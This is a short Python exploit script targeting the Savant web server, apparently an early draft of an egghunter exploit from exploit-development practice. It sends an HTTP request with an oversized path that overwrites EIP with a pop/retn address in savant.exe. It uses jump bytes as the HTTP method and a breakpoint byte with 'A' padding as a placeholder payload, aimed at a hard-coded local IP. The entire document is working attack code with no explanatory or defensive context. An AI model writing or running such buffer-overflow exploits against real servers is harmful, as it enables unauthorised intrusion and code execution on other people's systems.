#!/usr/bin/python
import socket
 
banner = """
#----------------------------------------------#
Savant Exploit - Egghunter
#----------------------------------------------#
"""

target_address="192.168.37.131"
target_port=80
 
badbuffer = "\xcc"
badbuffer += "A"*(254-len(badbuffer))
badbuffer += "\x09\x1D\x40" # EIP overwrite 00401d09 savant.exe pop ebp, retn
httpmethod = "\xeb\x19"

sendbuf = httpmethod + " /%" + badbuffer + '\r\n\r\n'

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address, target_port))
sock.send(sendbuf)
sock.close()

